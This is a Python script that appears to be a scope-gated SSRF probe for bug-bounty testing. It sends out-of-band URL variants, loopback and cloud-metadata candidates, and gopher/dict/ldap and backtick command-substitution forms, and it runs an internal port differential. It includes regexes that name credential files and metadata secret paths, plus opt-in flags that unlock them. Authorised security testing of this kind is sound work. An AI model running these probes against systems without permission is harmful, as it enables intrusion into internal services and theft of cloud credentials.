#!/usr/bin/env python3
"""Scope-gated SSRF probe for ONE URL-accepting input (FUZZ in --url, --data, --json or one --header).

Modes:
  oob       send labelled out-of-band variants to YOUR collaborator; each variant uses its own subdomain label
            (v01-<id>.YOUR.COLLAB) so the DNS/HTTP hits tell you which form the fetcher accepted
  internal  send internal candidates (loopback encodings, benign cloud-metadata paths, --candidates FILE) and
            compare each with a baseline for an unresolvable host; flags status/length/time differences and
            signatures (metadata keys, service banners, /etc/passwd first line)
  ports     bounded port differential on ONE internal host (default 127.0.0.1, <= 30 common ports)

Usage:
  ssrf_probe.py --target example.com --url 'https://app.example.com/fetch?url=FUZZ' --mode oob --collab YOU.oast.fun
  ssrf_probe.py --target example.com --json '{"webhook":"FUZZ"}' --url https://app.example.com/api/hooks --mode internal
  ssrf_probe.py --target example.com --url 'https://app.example.com/preview?u=FUZZ' --mode ports --host 127.0.0.1

Safety: sensitive paths (IAM/ECS/GCP/Azure credentials, user-data, tokens, recursive dumps, k8s secrets,
/proc/self/environ, keys) are refused unless BB_SSRF_ALLOW_SENSITIVE=1; gopher://, dict:// and ldap:// to
anything except your collaborator are refused unless BB_SSRF_ALLOW_PROTOCOL=1; port scans are limited to one
host and 30 ports unless BB_SSRF_ALLOW_SCAN=1. If a response contains credential-like material the body is
redacted in all output and the run stops.
"""
import argparse
import importlib.util
import json
import os
import random
import re
import ssl
import statistics
import string
import subprocess
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import quote, urlsplit

HERE = os.path.dirname(os.path.abspath(__file__))
SENSITIVE_PATH = re.compile(r"(security-credentials/[^/\s]+|identity-credentials|user-data|userdata|/token|"
                            r"service-accounts|recursive=true|/v2/credentials|invocation/next|ram/security-credentials|"
                            r"/secrets|serviceaccount|environ|shadow|id_rsa|\.aws|\.ssh|\.env\b|\.kube|private)", re.I)
SECRET_BODY = re.compile(r"(AccessKeyId|SecretAccessKey|\"Token\"\s*:|access_token|-----BEGIN [A-Z ]*PRIVATE KEY|"
                         r"\"private_key\"|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|client_secret)", re.I)
SIGNATURES = {
    "aws-metadata": r"\b(ami-id|instance-id|reservation-id|security-credentials|i-[0-9a-f]{8,17}|ami-[0-9a-f]{8,17})\b",
    "gcp-metadata": r"(computeMetadata|Metadata-Flavor|\bproject-id\b)",
    "azure-metadata": r"(\"vmId\"|\"azEnvironment\"|Required metadata header not specified)",
    "metadata-generic": r"(\bhostname\b.*\bpublic-keys\b|meta_data\.json|instance_id)",
    "passwd": r"root:[^:\n]*:0:0:",
    "win.ini": r"\[(fonts|extensions)\]",
    "ssh-banner": r"SSH-\d\.\d-",
    "redis": r"(-ERR (wrong|unknown)|redis_version|-NOAUTH)",
    "memcached": r"(STAT pid|ERROR\r?\n)",
    "smtp": r"^220 .*(SMTP|ESMTP)",
    "mysql": r"(mysql_native_password|\x00\x00\x00\x0a\d)",
    "http-server-default": r"(Welcome to nginx|Apache2 .*Default Page|IIS Windows Server|It works!)",
    "jenkins": r"(X-Jenkins|Dashboard \[Jenkins\])",
    "spring-actuator": r"(\"_links\"\s*:\s*\{\s*\"self\"|actuator)",
    "elasticsearch": r"(\"cluster_name\"|You Know, for Search)",
    "kubernetes": r"(\"gitVersion\"|\"kind\"\s*:\s*\"(Status|PodList)\")",
    "docker": r"(\"ApiVersion\"|\"DockerRootDir\")",
    "consul": r"(\"Datacenter\"|\"NodeName\")",
}
DEFAULT_PORTS = [21, 22, 25, 80, 443, 2375, 2379, 3000, 3306, 4040, 5000, 5432, 5601, 6379, 7990, 8000, 8080,
                 8443, 8500, 9000, 9001, 9090, 9200, 9222, 10250, 11211, 15672, 27017]


def load(name):
    spec = importlib.util.spec_from_file_location(name, os.path.join(HERE, name + ".py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def gate(host):
    script = os.path.normpath(os.path.join(HERE, "..", "..", "..", "..", "scripts", "scope_check.sh"))
    try:
        r = subprocess.run(["bash", script, host], capture_output=True, text=True)
    except FileNotFoundError:
        sys.exit("bash not found; cannot run scope gate")
    sys.stderr.write((r.stdout + r.stderr).strip() + "\n")
    if r.returncode != 0:
        sys.exit(r.returncode)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--data")
    ap.add_argument("--json")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--method")
    ap.add_argument("--mode", choices=["oob", "internal", "ports"], required=True)
    ap.add_argument("--collab", help="your own OOB host (oob mode)")
    ap.add_argument("--candidates", help="file of extra internal URLs (internal mode)")
    ap.add_argument("--cloud", help="limit metadata candidates: aws,gcp,azure,...")
    ap.add_argument("--host", default="127.0.0.1", help="ports mode: one internal host")
    ap.add_argument("--ports", help="ports mode: comma list (max 30)")
    ap.add_argument("--scheme", default="http", help="ports mode scheme")
    ap.add_argument("--delay", type=float, default=0.7)
    ap.add_argument("--timeout", type=float, default=25)
    ap.add_argument("--out", default="artifacts/ssrf/probe.tsv")
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()

    where = [x for x in ("url", "data", "json") if "FUZZ" in (getattr(a, x) or "")] + \
            [h for h in a.header if "FUZZ" in h]
    if len(where) != 1:
        sys.exit("exactly one of --url / --data / --json / --header must contain FUZZ")
    host = (urlsplit(a.url).hostname or "").lower()
    t = a.target.lower()
    if host != t and not host.endswith("." + t):
        sys.exit(f"URL host {host} outside target {a.target}")
    if a.mode == "oob" and not a.collab:
        sys.exit("--collab YOUR-OOB-HOST is required for oob mode")
    allow_sens = os.environ.get("BB_SSRF_ALLOW_SENSITIVE") == "1"
    allow_proto = os.environ.get("BB_SSRF_ALLOW_PROTOCOL") == "1"
    allow_scan = os.environ.get("BB_SSRF_ALLOW_SCAN") == "1"
    gen = load("ssrf_payloads")
    tid = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))

    # ---- build candidate list ------------------------------------------------------------------
    cands = []   # (label, family, value)
    if a.mode == "oob":
        C = a.collab
        lab = lambda i: f"v{i:02d}-{tid}.{C}"
        forms = [("http", "http://{h}/bbtest"), ("https", "https://{h}/bbtest"), ("scheme-relative", "//{h}/bbtest"),
                 ("bare-host", "{h}"), ("http-port-8080", "http://{h}:8080/bbtest"), ("userinfo", "http://bbtest@{h}/"),
                 ("uppercase", "HTTP://{h}/bbtest"), ("backslash", "http:\\\\{h}\\bbtest"), ("one-slash", "http:/{h}/bbtest"),
                 ("ftp", "ftp://{h}/bbtest"), ("gopher", "gopher://{h}:80/_bbtest"), ("dict", "dict://{h}:80/bbtest"),
                 ("ldap", "ldap://{h}:389/bbtest"), ("jar", "jar:http://{h}/bbtest.zip!/x"), ("unc", "\\\\{h}\\bbtest"),
                 ("svg-like", "http://{h}/bbtest.svg"), ("image-ext", "http://{h}/bbtest.png"),
                 ("cmd-subst (blind RCE hint)", "http://{h}/?x=`echo bbtest`")]
        for i, (n, f) in enumerate(forms, 1):
            cands.append((n, "oob", f.format(h=lab(i))))
    elif a.mode == "internal":
        for r in gen.build("127.0.0.1", families=["ip", "ipv6"]):
            cands.append((r["note"], "loopback", r["payload"]))
        for r in gen.build("127.0.0.1", families=["scheme"]):
            if r["cls"] == "R":
                cands.append((r["note"], "scheme", r["payload"]))
        for r in gen.build("169.254.169.254", families=["metadata"],
                           clouds=[c.strip() for c in a.cloud.split(",")] if a.cloud else None):
            cands.append((r["note"], r["family"], r["payload"]))
        if a.candidates:
            with open(a.candidates, encoding="utf-8") as fh:
                cands += [("custom", "custom", ln.strip()) for ln in fh if ln.strip() and not ln.startswith("#")]
    else:
        ports = [int(p) for p in a.ports.split(",")] if a.ports else DEFAULT_PORTS
        is_range = "/" in a.host or "," in a.host or re.search(r"\d+\.\d+\.\d+\.\d+\s*-", a.host)
        if (len(ports) > 30 or is_range) and not allow_scan:
            sys.exit("ports mode: one host and <= 30 ports (set BB_SSRF_ALLOW_SCAN=1 only with explicit permission)")
        cands = [(f"port {p}", "port", f"{a.scheme}://{a.host}:{p}/") for p in ports]
        cands.insert(0, ("port 1 (assumed closed)", "port-ref", f"{a.scheme}://{a.host}:1/"))

    filtered = []
    for lab_, fam, v in cands:
        if SENSITIVE_PATH.search(v) and not allow_sens:
            print(f"[skip] sensitive (needs BB_SSRF_ALLOW_SENSITIVE=1): {v}", file=sys.stderr)
            continue
        sch = v.split(":", 1)[0].lower()
        if sch in ("gopher", "dict", "ldap", "ldaps") and not (a.collab and a.collab in v) and not allow_proto:
            print(f"[skip] internal {sch}:// (needs BB_SSRF_ALLOW_PROTOCOL=1): {v}", file=sys.stderr)
            continue
        filtered.append((lab_, fam, v))
    cands = filtered
    gate(host)

    ctx = ssl.create_default_context()
    if a.insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    method = (a.method or ("POST" if (a.data or a.json) else "GET")).upper()

    def send(v):
        hdrs = {"User-Agent": "bbtest-ssrf/1.0"}
        body = None
        if a.data:
            body = a.data.replace("FUZZ", quote(v, safe="")).encode()
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        elif a.json:
            body = a.json.replace("FUZZ", json.dumps(v)[1:-1]).encode()
            hdrs["Content-Type"] = "application/json"
        for h in a.header:
            k, _, hv = h.partition(":")
            hdrs[k.strip()] = hv.strip().replace("FUZZ", v)
        url = a.url.replace("FUZZ", quote(v, safe="")) if where[0] == "url" else a.url
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        t0 = time.monotonic()
        try:
            with opener.open(req, timeout=a.timeout) as r:
                code, b = r.status, r.read(1_000_000)
        except urllib.error.HTTPError as e:
            code, b = e.code, e.read(1_000_000)
        except Exception as e:  # noqa: BLE001
            code, b = 0, str(e).encode()
        el = time.monotonic() - t0
        time.sleep(a.delay)
        return code, b.decode("utf-8", "replace"), el

    rows, flagged = [], []
    nx = f"http://bbtest-nx-{tid}.invalid/"
    base = [send(nx) for _ in range(2)]
    if base[0][0] == 0:
        sys.exit(f"target unreachable: {base[0][1][:120]}")
    bcode, blen = base[0][0], len(base[0][1])
    btime = statistics.median(x[2] for x in base)
    print(f"[*] {a.mode}: {len(cands)} candidates; baseline (unresolvable host) {bcode} {blen}B {btime:.2f}s", file=sys.stderr)
    ref = None
    for i, (lab_, fam, v) in enumerate(cands):
        code, txt, el = send(v)
        if SECRET_BODY.search(txt):
            rows.append((fam, lab_, v, code, len(txt), f"{el:.2f}", "SECRET-REDACTED", "", ""))
            flagged.append((fam, lab_, v, code, "SECRET material returned - body redacted; stopping"))
            print(f"!! STOP: credential-like material returned for {v}. Body redacted. Do not use it; report and stop.")
            break
        sigs = [n for n, rx in SIGNATURES.items() if re.search(rx, txt, re.M | re.I)]
        if fam == "port-ref":
            ref = (code, len(txt), el)
        diff = []
        if code != bcode:
            diff.append(f"status {bcode}->{code}")
        if abs(len(txt) - blen) > max(30, blen * 0.1):
            diff.append(f"len {blen}->{len(txt)}")
        if el > btime + 3:
            diff.append(f"slow {el:.1f}s")
        if ref and fam == "port" and (code, len(txt) // 50) != (ref[0], ref[1] // 50):
            diff.append("differs from closed port")
        first = ""
        for n in sigs:
            m = re.search(SIGNATURES[n], txt, re.M | re.I)
            s = txt.rfind("\n", 0, m.start()) + 1
            e = txt.find("\n", m.end())
            first = txt[s: e if e != -1 else None][:160].strip()
            break
        rows.append((fam, lab_, v, code, len(txt), f"{el:.2f}", ",".join(sigs), "; ".join(diff), first))
        if a.mode == "oob":
            continue
        if sigs or (diff and fam not in ("port-ref",)):
            flagged.append((fam, lab_, v, code, (",".join(sigs) + " " + "; ".join(diff)).strip(), len(txt), bool(sigs), el))

    # signature hits individually; differential-only results grouped by (status, size) so filter pages collapse
    groups = {}
    for f in flagged:
        if f[6] if len(f) > 6 else True:
            print(f"!! {f[0]:<16} {f[3]:<4} {f[5] if len(f) > 5 else '':>7}B  {f[2][:80]:<80} {f[4]}")
        else:
            groups.setdefault((f[3], f[5] // 20), []).append(f)
    for (code, _), fs in sorted(groups.items(), key=lambda kv: len(kv[1])):
        if len(fs) >= 3:
            print(f" ~ {len(fs):>3} candidates -> status {code}, ~{fs[0][5]}B (same response: likely the filter/block page), e.g. {fs[0][2][:60]}")
        else:
            for f in fs:
                print(f" ~ {f[0]:<16} {f[3]:<4} {f[5]:>7}B {f[7]:5.1f}s  {f[2][:80]:<80} {f[4]}")

    os.makedirs(os.path.dirname(a.out) or ".", exist_ok=True)
    with open(a.out, "w", encoding="utf-8") as fh:
        fh.write("family\tlabel\tvalue\tstatus\tbytes\tseconds\tsignatures\tdiff_vs_baseline\tfirst_matching_line\n")
        for r in rows:
            fh.write("\t".join(str(x).replace("\t", " ").replace("\n", " ") for x in r) + "\n")
    if a.mode == "oob":
        print(f"[+] sent {len(rows)} OOB variants (id {tid}). Check {a.collab} for hits; label -> form:")
        for i, (lab_, _, v) in enumerate(cands, 1):
            print(f"    v{i:02d}-{tid}  {lab_:<28} {v}")
        print("    DNS-only hits = resolver/prefetch (INFO); HTTP hits = the server fetches (SSRF). Note the User-Agent.")
    else:
        print(f"[+] {len(rows)} requests, {len(flagged)} flagged -> {a.out}")
        print("    '!!' = signature (strong); '~' = differential only - confirm manually and rule out generic error pages.")


if __name__ == "__main__":
    main()
